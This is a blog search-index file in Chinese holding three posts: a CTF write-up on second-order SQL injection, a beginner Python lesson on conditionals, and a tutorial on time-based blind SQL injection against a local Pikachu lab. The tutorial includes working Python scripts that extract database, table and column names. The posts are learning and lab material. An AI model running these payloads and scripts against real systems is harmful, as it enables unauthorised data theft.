<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SQL注入——二次注入</title>
    <link href="/2022/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——二次注入"><a href="#SQL注入——二次注入" class="headerlink" title="SQL注入——二次注入"></a>SQL注入——二次注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;二次注入是典型的存储类型注入，当在洁面奶有登录等交互界面时，我们可以构造恶意数据存储在数据库中，当第二次调用恶意数据时，该内容会被读取并执行SQL的查询语句，从而造成注入攻击。</p><p>&emsp;&emsp;注：这里有时候在输入上会纯在字符的长度限制，如果是咋前端，我们可以使用</p><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><p>&emsp;&emsp;第一步：插入恶意数据</p><p>&emsp;&emsp;第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p><p>&emsp;&emsp;第二步：引用恶意数据</p><p>&emsp;&emsp;在将数据存入到了数据库中之后，开发者就认为数据是可信的了（比较有提前筛选），在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这就形成了最终的SQL二次注入。</p><h4 id="2-注入尝试"><a href="#2-注入尝试" class="headerlink" title="2.注入尝试"></a>2.注入尝试</h4><p>&emsp;&emsp;这里以BUUCTF–October 2019 Twice SQL Injection的作为演示例子，当我们打开界面时间纯在用户登录界面，尝试使用进行登录界面注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，尝试注入失败，并没有任何的反馈。</p><p>&emsp;</p><h4 id="3-注册"><a href="#3-注册" class="headerlink" title="3.注册"></a>3.注册</h4><p>&emsp;&emsp;查看到有注册界面，点击进行注册尝试，用户采用admin’#，密码随意：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;登录之后的界面,显然是没有回显的：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;其实在前面也有提到过，在</p><p>&emsp;</p><h4 id="4-注册爆出数据库名"><a href="#4-注册爆出数据库名" class="headerlink" title="4.注册爆出数据库名"></a>4.注册爆出数据库名</h4><p>&emsp;&emsp;尝试使用二次注入的办法注册：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select database() #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="5-注册爆出权限"><a href="#5-注册爆出权限" class="headerlink" title="5.注册爆出权限"></a>5.注册爆出权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select user()#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/6.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-注册爆出表名"><a href="#6-注册爆出表名" class="headerlink" title="6.注册爆出表名"></a>6.注册爆出表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctftraining<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/8.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-注册爆出列名"><a href="#7-注册爆出列名" class="headerlink" title="7.注册爆出列名"></a>7.注册爆出列名</h4><p>&emsp;&emsp;看见有flag，直接兴奋</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-注册爆出列的内容"><a href="#8-注册爆出列的内容" class="headerlink" title="8.注册爆出列的内容"></a>8.注册爆出列的内容</h4><p>&emsp;&emsp;可恶，有够麻烦的，怎么还有一层</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select flag from flag #</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/10.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;搞定，收工咧</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python日记（三）</title>
    <link href="/2022/08/23/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2022/08/23/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python日记（三）"><a href="#Python日记（三）" class="headerlink" title="Python日记（三）"></a>Python日记（三）</h1><h4 id="1-if结构"><a href="#1-if结构" class="headerlink" title="1.if结构"></a>1.if结构</h4><ul><li><h6 id="if"><a href="#if" class="headerlink" title="if"></a>if</h6></li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/1.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>liaoyue = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请给撩月打分：&quot;</span>))<br><br><span class="hljs-keyword">if</span> liaoyue &gt;= <span class="hljs-number">85</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不敢当不敢当&quot;</span>)<br><br><span class="hljs-keyword">if</span> liaoyue &lt; <span class="hljs-number">60</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;你干嘛~哎呦&quot;</span>)<br><br><span class="hljs-keyword">if</span> (liaoyue &gt;= <span class="hljs-number">60</span>) <span class="hljs-keyword">and</span> (liaoyue &lt; <span class="hljs-number">85</span>):<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;指定没你好果汁吃！&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><ul><li><h6 id="if-else"><a href="#if-else" class="headerlink" title="if -else"></a>if -else</h6></li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/3.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>liaoyue = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请给撩月打分：&quot;</span>))<br><br><span class="hljs-keyword">if</span> liaoyue &gt;= <span class="hljs-number">85</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不敢当不敢当&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;你干嘛~哎呦&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/4.jpg" style="zoom:80%;" /></center><p>&emsp;</p><ul><li><h6 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h6></li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/5.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>liaoyue = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请给撩月打分：&quot;</span>))<br><br><span class="hljs-keyword">if</span> liaoyue &gt;= <span class="hljs-number">90</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不敢当不敢当&quot;</span>)<br><span class="hljs-keyword">elif</span> liaoyue &gt;= <span class="hljs-number">80</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;还行还行&quot;</span>)<br><span class="hljs-keyword">elif</span> liaoyue &gt;= <span class="hljs-number">70</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;咋地，对我有意见啊&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;你干嘛~哎呦&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/6.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-while语句"><a href="#2-while语句" class="headerlink" title="2.while语句"></a>2.while语句</h4><p>（注：只有Python中的while循环是跟有else的，目前的其他语言是没有的）</p><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/7.jpg" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>盲注——时间型</title>
    <link href="/2022/08/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/"/>
    <url>/2022/08/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="盲注——时间型"><a href="#盲注——时间型" class="headerlink" title="盲注——时间型"></a>盲注——时间型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/1.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;经典查询，看看回显问题</p><p>&emsp;&emsp;正确情况：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/3.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;错误情况：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/2.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="2-尝试or注入"><a href="#2-尝试or注入" class="headerlink" title="2.尝试or注入"></a>2.尝试or注入</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/4.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;明显没反应，说明联合注入失败了</p><p>&emsp;</p><h4 id="3-尝试报错注入"><a href="#3-尝试报错注入" class="headerlink" title="3.尝试报错注入"></a>3.尝试报错注入</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/5.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;明显不行，看来只能盲注了</p><p>&emsp;</p><h4 id="4-尝试时间注入"><a href="#4-尝试时间注入" class="headerlink" title="4.尝试时间注入"></a>4.尝试时间注入</h4><p>&emsp;&emsp;通过上面的几次尝试明显没有回显的内容，所以无法考虑联合查询与报错注入，而且可以看见无论是正确的查询还是错误的查询，界面的反馈结果都是不变的，所以也不适合使用布尔注入，那就考虑时间注入。时间注入的主要问题就是等。当语句猜测正确时，会有明显的时间差。</p><p>&emsp;&emsp;正确的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">vince<span class="hljs-string">&#x27; and if(length(database())=7,sleep(2),0) #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/6.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;可以看见，当我们输入正确的时候，我们的注入时间明显会变长很多，这是由于使用了sleep函数，我这里设置的是多睡眠了2秒，所以明显是在加载中的，而当错误的时候，是很快网页就加载完毕了的。</p><h4 id="5-python脚本"><a href="#5-python脚本" class="headerlink" title="5.python脚本"></a>5.python脚本</h4><p>&emsp;&emsp;主要参考了上一篇写布尔注入写的代码和网络的脚本进行编写，参考链接：（使用的是python3.0版本）</p><ul><li><a href="https://blog.csdn.net/weixin_30265103/article/details/99953534">https://blog.csdn.net/weixin_30265103/article/details/99953534</a></li></ul><h5 id="①先爆数据库："><a href="#①先爆数据库：" class="headerlink" title="①先爆数据库："></a>①先爆数据库：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><br>s = requests.session()<br>url = <span class="hljs-string">&quot;http://127.0.0.1/pika/vul/sqli/sqli_blind_t.php&quot;</span>  <span class="hljs-comment"># 选择攻击的网址</span><br><br><span class="hljs-comment"># headers = &#123;&#x27;cookie&#x27;: &#x27;&#x27;&#125;  # 需要登录的可以添加cookie值</span><br><br><span class="hljs-comment"># 爆破数据库的长度</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-comment"># 这里对#和\都进行了url编码处理，在#好后将完整的url拼接起来,然后注意了，需要url转码，例如&#x27;需要变成%27</span><br>    <span class="hljs-comment"># vince&#x27; and if(length(database())=7,sleep(2),0) #</span><br>    databaselen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28database%28%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url+databaselen_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2-time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>        database_len = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database_length:&quot;</span>, <span class="hljs-built_in">str</span>(database_len))<br><br><span class="hljs-comment"># 暴数据库的名</span><br>database_name = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(ascii(substr(database(),&quot;+str(l)+&quot;,1))=&quot;+str(i)+&quot;,sleep(2),1)#</span><br>        database_name_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28database%28%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C1%29+%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 记录请求前后时间</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + database_name_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>            database_name = database_name + <span class="hljs-built_in">chr</span>(i)<br>            database_len = l<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;database_name:&#x27;</span>, database_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/7.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h5 id="②爆表内容："><a href="#②爆表内容：" class="headerlink" title="②爆表内容："></a>②爆表内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆表的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=&quot;+str(l)+&quot;,sleep(1),0)#</span><br>    tablenumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%281%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url + tablenumber_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2 - time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">1</span>:<br>        tablenumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tablenumber:&#x27;</span>, tablenumber)<br><br><span class="hljs-comment"># 爆表名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablenumber):<br>    table_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;,sleep(2),0)#</span><br>        tablelen_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>        <span class="hljs-comment"># 记录请求前后时间</span><br>        time1 = datetime.datetime.now()<br>        r = s.get(url + tablelen_payload)<br>        time2 = datetime.datetime.now()<br>        <span class="hljs-comment"># 对比时间差</span><br>        sec = (time2 - time1).seconds<br>        <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">1</span>:<br>            tablelen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;:&quot;</span>, tablelen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablelen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url 这里需要注意下sleep的时间不能过短，我一开始设置的是1，结果就对了名字的一部分，这说明</span><br>            <span class="hljs-comment"># ?name=vince&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;,sleep(1),0)#</span><br>            tablename_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>            <span class="hljs-comment"># 记录请求前后时间</span><br>            time3 = datetime.datetime.now()<br>            g = s.get(url + tablename_payload)<br>            time4 = datetime.datetime.now()<br>            <span class="hljs-comment"># 对比时间差</span><br>            sec = (time4 - time3).seconds<br>            <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>                table_name = table_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, table_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/8.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h5 id="③爆列内容："><a href="#③爆列内容：" class="headerlink" title="③爆列内容："></a>③爆列内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆列的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and if((select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=&quot;+str(l)+&quot;,sleep(2),0)#</span><br>    columnnumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+if%28%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2Csleep%282%29%2C0%29%23&amp;submit=查询&quot;</span><br>    <span class="hljs-comment"># 记录请求前后时间</span><br>    time1 = datetime.datetime.now()<br>    r = s.get(url + columnnumber_payload)<br>    time2 = datetime.datetime.now()<br>    <span class="hljs-comment"># 对比时间差</span><br>    sec = (time2 - time1).seconds<br>    <span class="hljs-keyword">if</span> sec &gt;= <span class="hljs-number">2</span>:<br>        columnnumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;columnnumber:&#x27;</span>, columnnumber)<br><br><span class="hljs-comment"># 爆列名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnnumber):<br>    column_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span 